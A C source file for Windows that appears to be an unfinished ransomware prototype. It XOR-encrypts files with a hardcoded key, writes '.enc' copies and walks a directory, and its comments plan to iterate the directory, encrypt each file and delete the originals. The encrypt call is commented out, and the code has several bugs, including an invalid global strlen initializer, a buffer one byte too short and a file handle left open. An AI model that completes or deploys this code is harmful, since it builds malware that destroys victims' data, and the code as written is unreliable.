#include <Windows.h>
#include <stdio.h>

#define max_size 256

char enc_key[] = "hello world";
int key_size = strlen(enc_key);


void encrypt_data(char *data, int data_size, char *data_out) {
    for (int i = 0; i < data_size; i++) {
        data_out[i] = data[i] ^ enc_key[i % key_size];
    }
}

void decrypt_data(char *enc_data, int data_size, char *data_out) {
    for (int i = 0; i < data_size; i++) {
        data_out[i] = enc_data[i] ^ enc_key[i % key_size];
    }
}

void print_data(char *data, int data_size) {

    for (int i = 0; i < data_size; i++) {
        printf("%02X ", data[i]);
    }

    printf("\r\n-------------\r\n");

}

void encrypt_file(char *file_name) {

    char read_buffer[max_size] = {0};
    char write_buffer[max_size] = {0};
    DWORD bytes_in = 0, bytes_out = 0;
    DWORD file_size = 0;
    char *data_out;
    DWORD f_index = 0;
    HANDLE hFile, hOutFile;
    char *out_file_name;

    out_file_name = (char*)malloc((strlen(file_name) + 4) * sizeof(char));
    strcpy(out_file_name, file_name);
    strcat(out_file_name, ".enc");

    printf("outfilename: %s\r\n", out_file_name);
    printf("infilename: %s\r\n", file_name);

    hFile = CreateFileA(file_name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file for reading. Error No: %08X", GetLastError());
        return;
    }

    hOutFile = CreateFileA(out_file_name, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hOutFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file for writing. Erro No: %08X", GetLastError());
        return;
    }

    while (ReadFile(hFile, read_buffer, max_size, &bytes_in, NULL) && bytes_in != 0) {
        encrypt_data(read_buffer, bytes_in, write_buffer);
        WriteFile(hOutFile, write_buffer, bytes_in, &bytes_out, NULL);

        if (bytes_in != bytes_out) {
            printf("Error: %08X\r\n", GetLastError());
        }
    }

    CloseHandle(hFile);
}

BOOL iterate_directory(char *dir_name) {
    WIN32_FIND_DATA win32FindData;
    HANDLE hFind = FindFirstFileA(dir_name, &win32FindData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    do {
        printf("%s\r\n", win32FindData.cFileName);
    } while(FindNextFileA(hFind, &win32FindData) != 0);

    return TRUE;
}

int main(int argc, char *argv[]) {

    // iterate directory
    // open file and encrypt
    // delete original file

    iterate_directory(argv[1]);

    // printf("file_name: %s\r\n", argv[1]);
    // encrypt_file(argv[1]);

    return 0;

    char orig_data[] = "I am sanjay. how do you know my name. I don't like it...";
    const int data_size = strlen(orig_data);

    char *data_out = (char*)malloc(data_size * sizeof(char));
    char *dec_data = (char*)malloc(data_size * sizeof(char));

    print_data(orig_data, data_size);

    printf("strlen: %d\r\n", strlen(orig_data));

    encrypt_data(orig_data, data_size, data_out);

    print_data(data_out, data_size);

    decrypt_data(data_out, data_size, dec_data);

    print_data(dec_data, data_size);

    return 0;

}